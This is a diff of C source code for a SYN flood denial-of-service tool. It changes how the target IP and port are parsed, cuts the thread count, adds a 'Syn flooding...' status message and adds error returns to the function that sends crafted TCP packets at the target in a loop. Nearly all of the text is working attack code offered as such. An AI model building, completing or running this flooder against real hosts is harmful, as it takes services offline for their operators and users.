@@ -1,6 +1,6 @@
 #include "protocol.h"
 
-#define TH_N 12
+#define TH_N 1
 
 struct thread_arg
 {
@@ -10,28 +10,56 @@ struct thread_arg
 
 int make_socket();
 void make_packet(struct tcp_packet *packet, struct sockaddr_in *addr);
-void attack(int sock, struct sockaddr_in *addr);
+int attack(int sock, struct sockaddr_in *addr);
 void *synflood_thread_function(void *p);
 
-int syn_flood(char* ip, char *port) {
+int syn_flood(int argc, ...) {
     struct thread_arg th_arg[TH_N];
     pthread_t thread_id[TH_N];
     struct sockaddr_in t_addr;
     int sock;
     uint32_t t_ip;
     int t_port;
+    char *inputData, *ptr;
+    va_list ap;
+
+    va_start(ap, argc);
     
-    if((t_ip = inet_addr(ip))<0)
+    switch(argc)
     {
-        printf("IP error\n");
+        case 1:
+            inputData = va_arg(ap, char*);
+            va_end(ap);
+            if(ptr=strchr(inputData,':'))
+            {
+                strtok(inputData,":");
+                t_port = atoi(ptr+1);
+            }
+            else
+            {
+                printf("Usage error\n");
+                return -1;
+            }
+            break;
+        case 2:
+            inputData = va_arg(ap, char*);
+            t_port = atoi(va_arg(ap, char *));
+            va_end(ap);
+            break;
+    }
+
+    if((t_ip = inet_addr(inputData))<0)
+    {
+        printf("IP address error\n");
         return -1;
     }
-    t_port=atoi(port);
+
     if(t_port<=0 || t_port>65535)
     {
         printf("Port error\n");
         return -1;
     }
+
     srand((unsigned int)time(NULL));
     
     memset(&t_addr, 0 , sizeof(struct sockaddr_in));
@@ -39,6 +67,7 @@ int syn_flood(char* ip, char *port) {
     t_addr.sin_port = htons((uint16_t)t_port);
     t_addr.sin_family = AF_INET;
 
+    printf("%s:%d Syn flooding...\n",inet_ntoa(t_addr.sin_addr), t_port);
     for(int n = 0 ; n<TH_N ; n++)
     {
         th_arg[n].sock = make_socket();
@@ -47,7 +76,7 @@ int syn_flood(char* ip, char *port) {
     }
 
     sock = make_socket();
-    attack(sock, &t_addr);
+    if(attack(sock, &t_addr)<0) return -1;
 
 	return 0;
 }
@@ -83,7 +112,7 @@ void make_packet(struct tcp_packet *packet, struct sockaddr_in *addr)
     port++;
 }
 
-void attack(int sock, struct sockaddr_in *addr)
+int attack(int sock, struct sockaddr_in *addr)
 {
     struct tcp_packet packet;
 
@@ -94,7 +123,10 @@ void attack(int sock, struct sockaddr_in *addr)
         make_packet(&packet, addr);
         
 		if(sendto(sock, &packet, sizeof(packet), 0, (struct sockaddr *)addr, sizeof(struct sockaddr_in))<0)
+        {
             perror("sendto");
+            return -1;
+        }    
     }
 }
 
